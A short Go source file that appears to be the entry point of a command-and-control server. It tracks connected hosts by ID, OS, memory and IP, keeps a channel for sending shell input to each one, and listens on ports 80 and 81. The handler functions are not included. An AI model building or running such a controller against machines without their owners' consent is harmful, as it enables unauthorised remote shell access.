package main

import "net"

type S struct {
	uuid   string
	memory string
	OS     string
	ip     string
	intIp string
	status int // CONST: SERVER_
	shellInChan chan string
}

var tcpConn bool
var httpConn bool
var serverMap = make(map[net.Conn]*S)
var sign = "customize\x00"

var httpPort string
var serverPort string
func main() {
	httpPort = ":80"
	serverPort = ":81"
	go HTTPService(httpPort)
	listen(serverPort)
}
